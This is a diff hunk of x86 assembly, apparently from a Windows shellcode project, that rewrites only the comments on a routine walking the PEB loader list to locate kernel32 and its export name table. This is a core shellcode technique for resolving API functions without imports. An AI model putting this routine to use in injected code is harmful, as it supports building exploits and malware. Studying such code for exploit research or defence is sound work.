@@ -220,20 +220,20 @@ _start:
 
 xor ecx, ecx
 mul ecx
-mov eax, [fs:ecx + 0x30] ; EAX = PEB
-mov eax, [eax + 0xc]     ; EAX = PEB->Ldr
-mov esi, [eax + 0x14]    ; ESI = PEB->Ldr.InMemOrder
-lodsd                    ; EAX = Second module
-xchg eax, esi            ; EAX = ESI, ESI = EAX
-lodsd                    ; EAX = Third(kernel32)
-mov ebx, [eax + 0x10]    ; EBX = Base address
-mov edi, [ebx + 0x3c]    ; EDi = DOS->e_lfanew
-add edi, ebx             ; EDi = PE Header
-mov edi, [edi + 0x78]    ; EDi = Offset export table
-add edi, ebx             ; EDi = Export table
-mov esi, [edi + 0x20]    ; ESI = Offset namestable
-add esi, ebx             ; ESI = Names table
-xor ecx, ecx             ; EXC = 0
+mov eax, [fs:ecx + 0x30] ; PEB offset
+mov eax, [eax + 0xc]     ; LDR offset
+mov esi, [eax + 0x14]    ; InMemOrderModList
+lodsd                    ; 2nd module
+xchg eax, esi            ; 
+lodsd                    ; 3rd module
+mov ebx, [eax + 0x10]    ; kernel32 base address
+mov edi, [ebx + 0x3c]    ; e_lfanew offset
+add edi, ebx             ; offset + base
+mov edi, [edi + 0x78]    ; export table offset
+add edi, ebx             ; offset + base
+mov esi, [edi + 0x20]    ; namestable offset
+add esi, ebx             ; offset + base
+xor ecx, ecx             
 
 Get_Function:
  
